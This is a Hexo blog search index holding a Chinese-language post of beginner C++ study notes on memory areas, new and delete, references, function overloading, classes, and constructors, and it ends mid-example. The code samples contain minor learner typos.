<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>c++语法学习</title>
    <link href="/2025/03/19/c++%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/"/>
    <url>/2025/03/19/c++%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="内存分区模型"><a href="#内存分区模型" class="headerlink" title="内存分区模型"></a>内存分区模型</h1><ul><li>代码区：存放二进制代码，由操作系统管理</li><li>全局区：存放全局变量、静态变量、全局常量</li><li>栈区：<strong>编译器</strong>自动分配释放，存放函数参数值、局部变量等</li><li>堆区：由<strong>程序员</strong>分配、释放，若不释放，结束时由操作系统回收</li></ul><p>意义：赋予不同的生命周期，灵活编程</p><h2 id="程序运行前"><a href="#程序运行前" class="headerlink" title="程序运行前"></a>程序运行前</h2><p>未执行.exe文件前，分为两个区域</p><ul><li><p>代码区：</p><ul><li>存放cpu执行的机器指令</li><li>特点：共享（频繁被执行的程序只要在内存中有一份代码即可），只读（防止程序意外修改了指令）</li></ul></li><li><p>全局区：</p><ul><li><p>全局变量和静态变量在此</p></li><li><p>包含常量区，字符串常量和其他常量也存放在此</p></li><li><p>该区域数据在程序结束后由<strong>操作系统</strong>释放</p></li><li><p>静态变量：在前面加<code>static</code>，比如<code>static int a=10</code></p><p>常量：分为全局的和局部的，但只有全局的常量在常量区，<code>const int a=10</code></p></li></ul></li></ul><h2 id="程序运行后"><a href="#程序运行后" class="headerlink" title="程序运行后"></a>程序运行后</h2><ul><li>栈区<ul><li>存放函数的局部变量及参数，编译器自动开辟与free</li></ul></li><li>堆区<ul><li>由程序员手动分配与释放，如果程序员不释放的话就由操作系统释放</li><li>在c++中用<code>new</code>来分配内存</li></ul></li></ul><h2 id="new操作符语法"><a href="#new操作符语法" class="headerlink" title="new操作符语法"></a>new操作符语法</h2><p>分配：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span>* <span class="hljs-title">func</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span>* p=<span class="hljs-keyword">new</span> <span class="hljs-built_in">int</span>(<span class="hljs-number">10</span>);<span class="hljs-comment">//在堆中开辟了一块int大小的数据，其中的数据是10，并且new会返回分配的地址</span><br><span class="hljs-keyword">return</span> p;<br>&#125;<br></code></pre></td></tr></table></figure><p>释放：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> *p=<span class="hljs-built_in">func</span>();<br>cout&lt;&lt;*p&lt;&lt;endl;<br><span class="hljs-keyword">delete</span> p;<br>cout&lt;&lt;*p&lt;&lt;endl;<span class="hljs-comment">//这句会报错，因为用delete释放了</span><br>&#125;<br></code></pre></td></tr></table></figure><p>开辟一段连续的数组空间：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span>* <span class="hljs-title">func2</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span>* p=<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[<span class="hljs-number">10</span>];<span class="hljs-comment">//开辟了int类型的10个空间</span><br>     <span class="hljs-comment">//赋值</span><br>     <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++)<br>          p[i]=i;<br>     <span class="hljs-comment">//打印</span><br>     <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++)<br>          cout&lt;&lt;p[i]&lt;&lt;endl;<br>reuturn p;<br>&#125;<br></code></pre></td></tr></table></figure><p>释放数组：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> *p=<span class="hljs-built_in">func2</span>();<br><span class="hljs-keyword">delete</span>[] p;<span class="hljs-comment">//记得加中括号</span><br>reuturn <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><h2 id="基本语法使用"><a href="#基本语法使用" class="headerlink" title="基本语法使用"></a>基本语法使用</h2><ul><li><p>作用</p><ul><li>给变量起别名</li></ul></li><li><p>语法</p><ul><li><p>数据类型 &amp;别名&#x3D;原名</p></li><li><p>比如原来有<code>int a=10</code></p><p>创建引用<code>int &amp;b=a;</code></p></li></ul></li></ul><p>操作的是同一块内存</p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li><p>必须初始化</p><p><code>int &amp;b</code>错误的</p></li><li><p>初始化后不可改变引用的对象</p></li></ul><h2 id="引用作为函数参数"><a href="#引用作为函数参数" class="headerlink" title="引用作为函数参数"></a>引用作为函数参数</h2><ul><li>作用：<ul><li>可以用引用让形式参数修饰实参</li><li>可以不用指针，简化思考</li></ul></li></ul><p>这里举一个交换两个数的例子</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(<span class="hljs-type">int</span> &amp;a,<span class="hljs-type">int</span> &amp;b)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> temp=a;<br>a=b;<br>b=temp;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>     <span class="hljs-type">int</span> a=<span class="hljs-number">10</span>,b=<span class="hljs-number">20</span>;<br>     cout&lt;&lt;<span class="hljs-string">&quot;交换前：a=&quot;</span>&lt;&lt;a;<br>     cout&lt;&lt;<span class="hljs-string">&quot; b=&quot;</span>&lt;&lt;b&lt;&lt;endl;<br>     <span class="hljs-built_in">swap</span>(a,b);<br>     cout&lt;&lt;<span class="hljs-string">&quot;交换后：a=&quot;</span>&lt;&lt;a;<br>     cout&lt;&lt;<span class="hljs-string">&quot; b=&quot;</span>&lt;&lt;b&lt;&lt;endl;<br>     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="引用做函数返回值"><a href="#引用做函数返回值" class="headerlink" title="引用做函数返回值"></a>引用做函数返回值</h2><ul><li>注意：<ul><li>不能返回局部变量的引用</li></ul></li></ul><p>函数调用可以作为等号左边的值</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> &amp;<span class="hljs-title">test1</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> a=<span class="hljs-number">10</span>;<br><span class="hljs-keyword">return</span> a;<span class="hljs-comment">//这里返回的是a的引用</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> &amp;b=<span class="hljs-built_in">test1</span>();<br>cout&lt;&lt;<span class="hljs-string">&quot;b=&quot;</span>&lt;&lt;b&lt;&lt;endl;<br><span class="hljs-built_in">test1</span>()=<span class="hljs-number">1000</span>;<span class="hljs-comment">//这里是对a的引用进行了修改，相当于a=1000</span><br>cout&lt;&lt;<span class="hljs-string">&quot;b=&quot;</span>&lt;&lt;b&lt;&lt;endl;<span class="hljs-comment">//再用b（别名）进行访问</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="本质"><a href="#本质" class="headerlink" title="本质"></a>本质</h2><ul><li>本质：<ul><li>在C++内部就是一个<strong>指针常量</strong>，指向我引用的对象</li></ul></li></ul><h2 id="常量引用"><a href="#常量引用" class="headerlink" title="常量引用"></a>常量引用</h2><ul><li>作用：<ul><li>用于修饰形参，防止误操作，保护参数</li></ul></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test1</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">int</span> &amp;a)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//a=100，这里就会发生错误</span><br><span class="hljs-comment">//这里就可以防止这个变量的值发生改变，保护数据</span><br>cout&lt;&lt;a&lt;&lt;endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> &amp;a=<span class="hljs-number">10</span>;<span class="hljs-comment">//自己创建了一个值为10的空间，不可修改</span><br><span class="hljs-type">int</span> aa=<span class="hljs-number">10</span>;<br><span class="hljs-built_in">test1</span>(a);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="函数提高"><a href="#函数提高" class="headerlink" title="函数提高"></a>函数提高</h1><h2 id="函数默认参数"><a href="#函数默认参数" class="headerlink" title="函数默认参数"></a>函数默认参数</h2><p>C++中，函数的形参列表中可以有默认值</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test</span> <span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b=<span class="hljs-number">10</span>,<span class="hljs-type">int</span> c=<span class="hljs-number">20</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>如果我没有传参就用默认，如果我们有传参，就用我们传的参数</p><p>注意：</p><ul><li>如果某个位置有了默认参数，那么往后都必须要有默认值</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test</span> <span class="hljs-params">(<span class="hljs-type">int</span> a=<span class="hljs-number">10</span>,<span class="hljs-type">int</span> b,<span class="hljs-type">int</span> c)</span></span><br><span class="hljs-function"></span>&#123;<br>...<br>&#125;<span class="hljs-comment">//错误的</span><br></code></pre></td></tr></table></figure><ul><li>函数的声明和实现只能一边有默认参数</li></ul><h2 id="函数占位参数"><a href="#函数占位参数" class="headerlink" title="函数占位参数"></a>函数占位参数</h2><p>C++中可以有占位参数，用来占位，但在函数调用时必须填补该位置</p><p>比如</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span>)</span><span class="hljs-comment">//第二个int就是来占位的</span></span><br><span class="hljs-function"></span>&#123;<br>...<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">test</span>(<span class="hljs-number">10</span>,<span class="hljs-number">10</span>);<span class="hljs-comment">//必须填补那个占位的</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>占位参数还可以有默认参数，比如</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> = <span class="hljs-number">10</span>)</span><span class="hljs-comment">//第二个int就是来占位的</span></span><br><span class="hljs-function"></span>&#123;<br>...<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">test</span>(<span class="hljs-number">10</span>,<span class="hljs-number">10</span>);<span class="hljs-comment">//必须填补那个占位的</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="函数重载"><a href="#函数重载" class="headerlink" title="函数重载"></a>函数重载</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><ul><li>作用：<ul><li>函数名可以相同，提高重用性</li></ul></li><li>条件：<ul><li>同一个作用域（比如都是全局）</li><li>函数名相同</li><li>函数参数<strong>类型不同</strong>或<strong>个数不同</strong>或<strong>顺序不同</strong></li></ul></li><li>注意：<ul><li><strong>函数返回值不可作为函数重载的条件</strong></li></ul></li></ul><p>举个例子</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span><span class="hljs-comment">//参数个数不同</span></span><br><span class="hljs-function"></span>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;func(int a)被调用&quot;</span>&lt;&lt;endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;func()被调用&quot;</span>&lt;&lt;endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">func</span>(<span class="hljs-number">10</span>);<br><span class="hljs-built_in">func</span>();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li>引用作为函数重载的条件</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-type">int</span> &amp;a)</span></span><br><span class="hljs-function"></span>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;func(int &amp;a)被调用&quot;</span>&lt;&lt;endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">int</span> &amp;a)</span></span><br><span class="hljs-function"></span>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;func(const int &amp;a)被调用&quot;</span>&lt;&lt;endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> a=<span class="hljs-number">10</span>;<br><span class="hljs-built_in">func</span>(a);<span class="hljs-comment">//调用了第一个</span><br><span class="hljs-built_in">func</span>(<span class="hljs-number">10</span>);<span class="hljs-comment">//调用了第二个</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>函数重载碰到默认参数</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span></span><br><span class="hljs-function"></span>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;func(int a)被调用&quot;</span>&lt;&lt;endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b=<span class="hljs-number">10</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;func(int a,int b=10)被调用&quot;</span>&lt;&lt;endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//func(10);//错误的</span><br><span class="hljs-built_in">func</span>(<span class="hljs-number">10</span>,<span class="hljs-number">20</span>);<span class="hljs-comment">//正确的</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h1><p>C++面向对象三大特性：封装、继承、多态</p><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><h3 id="意义"><a href="#意义" class="headerlink" title="意义"></a>意义</h3><ul><li>将属性和行为封装在一起，表现事物</li><li>将属性和行为加以权限控制</li></ul><p><strong>意义1：</strong></p><ul><li>语法：<code>class 类名&#123; 属性、行为 &#125;</code></li></ul><p>比如设计一个圆类，求圆周长</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Circle</span><br>&#123;<br><span class="hljs-comment">//访问权限</span><br><span class="hljs-keyword">public</span>:<br><span class="hljs-comment">//属性</span><br><span class="hljs-type">int</span> r;<br><span class="hljs-comment">//行为</span><br><span class="hljs-function"><span class="hljs-type">double</span> <span class="hljs-title">c</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">2</span>*<span class="hljs-number">3.14</span>*r;<br>&#125;<br>&#125;;<span class="hljs-comment">//注意这里有一个分号</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>     <span class="hljs-comment">//通过圆类创建一个对象</span><br>     Circle c1;<br>     <span class="hljs-comment">//赋予属性</span><br>     c<span class="hljs-number">1.</span>r=<span class="hljs-number">10</span>;<br>     cout&lt;&lt;<span class="hljs-string">&quot;圆周长为&quot;</span>&lt;&lt;c<span class="hljs-number">1.</span><span class="hljs-built_in">c</span>()&lt;&lt;endl;<br>     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>类中的属性行为统一称为成员</p><p>属性：成员属性，成员变量</p><p>行为：成员函数，成员方法</p><p><strong>意义2：</strong></p><p>访问权限分为3种</p><ul><li>public 公共权限<ul><li>类内类外均可访问</li></ul></li><li>protected 保护权限<ul><li>类内可访问</li><li>类外不可访问</li><li>子可访问父</li></ul></li><li>private 私有权限<ul><li>类内可访问</li><li>类外不可访问</li><li>子不可访问父亲</li></ul></li></ul><h3 id="struct-class区别"><a href="#struct-class区别" class="headerlink" title="struct class区别"></a>struct class区别</h3><p>唯一区别：默认访问权限不同</p><p>struct：公共</p><p>class：私有</p><h3 id="将成员属性设置为私有"><a href="#将成员属性设置为私有" class="headerlink" title="将成员属性设置为私有"></a>将成员属性设置为私有</h3><p>优点1：将所有成员属性设置为私有，可以自己控制读写权限</p><p>优点2：对于写权限，我们可以检查数据有效性（就是在写的时候加if来判断即可）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">setname</span><span class="hljs-params">(string n)</span></span><br><span class="hljs-function"></span>&#123;<br>name=n;<br>&#125;<span class="hljs-comment">//这样就是可读可写</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getage</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;年龄为：&quot;</span>&lt;&lt;age&lt;&lt;endl;<br>&#125;这样就是只读了<br><span class="hljs-function">string <span class="hljs-title">setidol</span><span class="hljs-params">(string i)</span></span><br><span class="hljs-function"></span>&#123;<br>idol=i;<br>&#125;<span class="hljs-comment">//这样就是只写了</span><br><span class="hljs-keyword">private</span>:<br>string name;<span class="hljs-comment">//姓名，可读可写</span><br><span class="hljs-type">int</span> age=<span class="hljs-number">18</span>;<span class="hljs-comment">//年龄 只读</span><br>srring idol;<span class="hljs-comment">//偶像 只写</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="对象的初始化和清理"><a href="#对象的初始化和清理" class="headerlink" title="对象的初始化和清理"></a>对象的初始化和清理</h2><h3 id="构造函数和析构函数"><a href="#构造函数和析构函数" class="headerlink" title="构造函数和析构函数"></a>构造函数和析构函数</h3><p><strong>初始化</strong>和<strong>清理</strong>是非常重要的安全问题</p><ul><li>没有初始化，对象使用后果是位置的</li><li>使用完对象或变量没有及时清理，也会造成安全问题</li></ul><p>构造和析构就是来解决初始化和清理的，由编译器自动调用，<strong>如果我们不提供构造和析构，编译器会提供，但编译器提供的是空的</strong></p><ul><li>构造：主要作用在创建对象时为成员属性赋值，由编译器自动调用，无须手动</li><li>析构：主要作用在于对象销毁前自动调用，执行一些清理</li></ul><p>构造函数语法：<code>类名 ()&#123;&#125;</code></p><ul><li>没有返回值也不写void</li><li>函数名称和类名相同</li><li>可以有参数，因此可以发生重载</li><li>程序在调用对象的时候会自动调用构造，无须手动调用，而且只会调用一次</li></ul><p>析构函数语法：<code>~类名 ()&#123;&#125;</code></p><ul><li>没有返回值但也不写void</li><li>函数名称和类名相同，在名称前面加~</li><li><strong>不可以</strong>有参数，因此<strong>不可以</strong>发生重载</li><li>程序在对象销毁前会自动调用析构，无须手动调用且只会调用一次</li></ul><p>举例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">person</span>()<span class="hljs-comment">//构造函数</span><br>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;Person构造函数被调用&quot;</span>&lt;&lt;endl;<br>&#125;<br>~<span class="hljs-built_in">person</span>()<span class="hljs-comment">//析构函数</span><br>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;person析构函数被调用&quot;</span>&lt;&lt;endl;<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test1</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>     person p;<span class="hljs-comment">//栈上的数据，执行完毕后会释放这个对象，也就会执行析构函数</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">test1</span>();<br>     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="构造函数的分类及调用"><a href="#构造函数的分类及调用" class="headerlink" title="构造函数的分类及调用"></a>构造函数的分类及调用</h3><p>分类：</p><ul><li>按参数<ul><li>有参构造和无参构造</li></ul></li><li>按类型<ul><li>普通构造和拷贝构造</li></ul></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">person</span>()<span class="hljs-comment">//无参构造函数</span><br>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;Person无参构造函数被调用&quot;</span>&lt;&lt;endl;<br>&#125;<br><span class="hljs-built_in">person</span>(<span class="hljs-type">int</span> a)<span class="hljs-comment">//有参构造函数</span><br>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;Person有参构造函数被调用&quot;</span>&lt;&lt;endl;<br>&#125;<br>     <span class="hljs-comment">//拷贝构造函数</span><br>     <span class="hljs-comment">//将传入的对象身上的属性拷贝到我当前的对象上</span><br>     <span class="hljs-built_in">person</span>(<span class="hljs-type">const</span> person &amp;p)<br>     &#123;<br>          cout&lt;&lt;<span class="hljs-string">&quot;Person拷贝&quot;</span>&lt;&lt;endl;<br>          age=p.age<br>     &#125;<br>~<span class="hljs-built_in">person</span>()<span 